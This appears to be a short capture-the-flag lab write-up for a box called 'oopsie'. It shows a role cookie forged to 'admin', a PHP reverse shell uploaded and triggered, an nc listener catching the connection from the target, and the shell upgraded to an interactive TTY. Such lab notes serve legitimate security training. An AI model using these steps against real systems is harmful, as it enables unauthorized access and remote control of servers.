http://10.129.95.191/cdn-cgi/login/admin.php?content=uploads

Catch with burp and change the cookie:
Cookie: user=34322; role=admin

![[uploadWebShell.png]]

## Navigate to the shell
10.129.95.191/uploads/php-reverse-shell.php
Modify the cookie entry.
## Connecting to listener on attacker
```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.16.23] from (UNKNOWN) [10.129.95.191] 57962
Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 22:08:13 up 11 min,  0 users,  load average: 0.00, 0.04, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data

```

## Getting an interactive shell
```
$ python3 -c 'import pty;pty.spawn("/bin/bash");'
www-data@oopsie:/home/robert$

# Control z to backgroung
www-data@oopsie:/home/robert$ ^Z
zsh: suspended  nc -lvnp 1337
                                                                             
┌──(kali㉿kali)-[~]
└─$ stty raw -echo                                         
                                                                             
┌──(kali㉿kali)-[~]
                   └─$ fg                                  
[1]  + continued  nc -lvnp 1337
                               export Term=xterm

```